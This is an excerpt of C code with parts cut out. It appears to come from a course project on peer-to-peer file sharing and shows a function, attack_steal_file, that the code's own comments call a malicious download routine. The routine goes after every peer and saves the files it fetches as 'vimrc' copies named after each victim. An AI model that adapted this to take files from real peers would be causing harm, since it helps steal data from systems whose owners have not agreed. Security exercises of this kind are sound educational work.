...
static void attack_steal_file(task_t *t, task_t *tracker_task) {
	...
	assert((!t || t->type == TASK_DOWNLOAD)
	       && tracker_task->type == TASK_TRACKER);
	char *victim_alias = malloc(TASKBUFSIZ);

	// Quit if no peers, and skip this peer
	// In our malicious version of task_download, this is the only exit.
	// i.e. We attack all peers.
	if (!t || !t->peer_list) {
		error("* No peers are willing to serve '%s'\n",
		      (t ? t->filename : "that file"));
		task_free(t);
	...
	// Connect to the peer and write the GET command
	// In our version, we change the filename according to the alias.
	size_t alias_len = strlen(t->peer_list->alias);
	strncpy(victim_alias, t->peer_list->alias, alias_len);
	char *probe = victim_alias;
	while (*probe >= 'a' && *probe <= 'z') {
		probe++;
	}
	*probe = '\0';
	...
	for (i = 0; i < 50; i++) {
		if (i == 0) {
			// We change the disk_filename to avoid filename collision.
			sprintf(t->disk_filename, "%s-%s", "vimrc", victim_alias);
		} else {
			// We change the disk_filename to avoid filename collision.
			sprintf(t->disk_filename, "%s-%s~%d~", "vimrc", victim_alias, i);
		}
		t->disk_fd = open(t->disk_filename,
			O_WRONLY | O_CREAT | O_EXCL, 0666);
		if (t->disk_fd == -1 && errno != EEXIST) {
